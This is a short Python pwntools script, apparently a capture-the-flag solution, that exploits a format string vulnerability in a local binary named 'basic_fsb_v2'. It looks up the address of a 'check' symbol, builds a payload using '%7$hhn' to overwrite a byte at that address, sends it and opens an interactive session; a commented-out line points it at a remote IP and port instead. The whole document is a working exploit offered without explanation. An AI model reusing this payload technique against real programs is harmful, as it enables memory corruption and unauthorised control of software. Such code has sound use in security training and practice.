from pwn import *

p = process("./basic_fsb_v2")
# p = remote("141.164.39.45", 8002)
e = ELF("./basic_fsb_v2")

check = e.symbols['check']

print(hex(check))

pl = b''
pl += p32(check)
pl += '%{}c'.format( 0x101 - len(pl) ).encode()
pl += '%7$hhn'.encode()

pause()
p.send(pl)
p.interactive()
